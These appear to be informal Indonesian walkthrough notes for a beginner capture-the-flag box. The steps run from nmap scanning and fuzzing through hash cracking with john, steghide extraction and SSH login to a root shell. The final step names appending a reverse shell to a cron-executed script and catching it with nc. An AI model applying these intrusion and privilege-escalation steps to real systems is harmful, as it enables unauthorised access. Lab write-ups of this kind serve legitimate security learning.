1. scan nmap -> banyak yg kebuka -> 80 nginx -> http ada di port tinggi
2. fuzz ampe nemu robot.txt -> dapet hash md5 -> reverse md5 itu ternyata dicari di google 
3. fuzz di 80 ama yang di http -> di hidden fuzz lagi -> semua buka aja -> md5 base64 ada
4. di main page http apache ada hiddden message -> base62 tuh decode aja dari cyberchef
5. ke hidden path tuh -> ctrl u ada hash lagi -> sudo john hash --wordlist=easypz.txt --format=gost -> kadang bisa kadang ga
6. foto juga download -> steghide extract -sf binarycodepixabay.jpg -> cat cred nya ssh kesitu
7. bin to text -> ssh kesitu -> port nya liat scan nmap lagi -> ssh -p port -> cat flag user
8. rot13 tuh decode aja -> ga find / -type f -perm -u=s 2>/dev/null lagi tapi 
9. find / -type f -iname "*.sh" 2>/dev/null -> di var/www tuh cek coba 
10. atau ya cat /etc/crontab -> echo "revshell" >> .ygjalan -> nyalain nc klaim root
